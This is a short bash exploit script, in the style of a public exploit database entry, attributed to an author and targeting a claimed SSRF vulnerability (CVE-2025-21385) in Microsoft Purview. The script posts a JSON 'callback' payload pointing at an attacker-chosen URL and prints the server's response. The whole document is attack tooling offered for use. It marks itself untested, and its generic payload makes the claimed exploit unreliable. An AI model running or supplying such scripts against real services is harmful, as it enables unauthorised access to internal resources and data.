#!/usr/bin/env bash

#===================================================================
# Exploit Title: The SSRF vulnerability in Microsoft Purview
# Google Dork: N/A
# Date: 15/01/2025
# Exploit Author: Paulo Cezar
# Vendor Homepage: https://github.com/Pauloxc6
# Software Link: https://raw.githubusercontent.com/Pauloxc6/CVE-2025-21385/refs/heads/main/CVE-2025-21385.sh
# Version: 1.0
# Tested on: N/A
# CVE : 2025-21385
#===================================================================


function exploit_purview_ssrf() {
    local target_url="$1"
    local purview_url="$2"

    echo "[INFO] Starting SSRF exploit with Target URL: $target_url and Purview URL: $purview_url"

     # Check if required parameters are provided
    if [ -z "$target_url" ] || [ -z "$purview_url" ]; then
        echo "Error: Both target URL and purview URL are required."
        help
        exit 1
    fi

    echo "[INFO] Sending HTTP POST request to $purview_url with the payload."

    headers="Content-Type: application/json"
    payload=$(jq -n --arg callback "$target_url" '{callback: $callback}')

    response=$(curl -s -w "%{http_code}" -o response.txt -X POST "$purview_url" -H "$headers" -d "$payload")

    if [ "$response" -eq 200 ]; then
        echo "SSRF exploit successful! Data retrieved:"
        cat response.txt
    else
        echo "SSRF exploit failed!"
    fi
}

function help() {

    echo "[Help]"
    echo ""
    echo "Usage:"
    echo "bash $0 --exploit <tagert_url> <purview_url>"
    echo "--help              - Show this help menu"
    echo "--exploit <tu> <pu> - erform the SSRF exploit with target and purview URLs"

    exit 0
}

#Parser
if [ -z "$1" ];then
    help ; exit 1
fi

while [ -n "$1" ];do
    case "$1" in
        --help|-h)
            shift
            help
        ;;

        --exploit|-e)
            shift

            export target_url="$1"
            export purview_url="$2"

            if [ -z "$target_url" ] || [ -z "$purview_url" ]; then
                echo "Error: --exploit requires two arguments: <target_url> and <purview_url>."
                help
            fi
            exploit_purview_ssrf "$target_url" "$purview_url"
            exit 0
        ;;

        *)
            echo "Error: Invalid options $1"
            exit 0
    esac
done
